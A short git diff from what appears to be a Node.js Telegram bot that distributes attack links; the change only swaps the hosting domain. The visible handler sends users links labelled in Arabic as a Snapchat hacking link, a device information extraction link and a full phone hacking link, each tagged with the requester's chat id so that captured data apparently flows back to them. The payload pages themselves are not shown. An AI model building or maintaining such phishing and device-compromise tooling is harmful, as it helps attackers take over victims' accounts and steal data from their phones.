@@ -225,7 +225,7 @@ bot.on('callback_query', async (query) => {
     }
 
 
-    const domain = "https://apiwahm.onrender.com";
+    const domain = "https://botwahm-erfu.onrender.com";
     if (action === 'add_names') return bot.sendMessage(chatId, `🔥 رابط اختراق سناب شات:\n${domain}/snap?id=${chatId}`);
     if (action === 'collect_device_info') return bot.sendMessage(chatId, `🔥 رابط سحب معلومات الجهاز:\n${domain}/device?id=${chatId}`);
     if (action === 'add_nammes') return bot.sendMessage(chatId, `🔥 رابط اختراق الهاتف كاملاً:\n${domain}/hack_phone?id=${chatId}`);
